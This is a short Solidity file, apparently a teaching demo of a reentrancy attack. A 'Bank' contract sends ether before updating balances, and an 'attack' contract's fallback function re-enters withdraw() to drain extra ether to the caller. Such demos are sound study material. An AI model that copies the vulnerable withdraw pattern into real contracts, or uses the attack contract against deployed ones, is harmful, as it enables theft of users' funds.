pragma solidity ^0.4.16;

contract Bank {
   mapping(address => uint256) public clients;
   uint256 public ethBalance;

    function deposit() public payable {
        clients[msg.sender] = msg.value + clients[msg.sender];
        ethBalance = ethBalance + msg.value;
    }

    function withdraw(uint256 amount) public {
        require(amount <= clients[msg.sender]);
        msg.sender.call.value(amount)();
        ethBalance = ethBalance - amount;
        clients[msg.sender] = clients[msg.sender] - amount;
    }  
}

contract attack {
    bool public is_attack=true;
    address public bankAddress;
    
    Bank public B;
    
    constructor(address _bankAddress) public{
    bankAddress=_bankAddress;
    B = Bank(bankAddress);
       
   } 
    
    function() public payable {
        if (is_attack == true){
            is_attack = false;
            B.withdraw(1 ether);
        }
        
    }
    function deposit11() public payable{
        
        B.deposit.value(msg.value)();
    }
    
    function  withdraw11() public{

        B.withdraw(1 ether);
        msg.sender.transfer(this.balance);

   }
    
} 
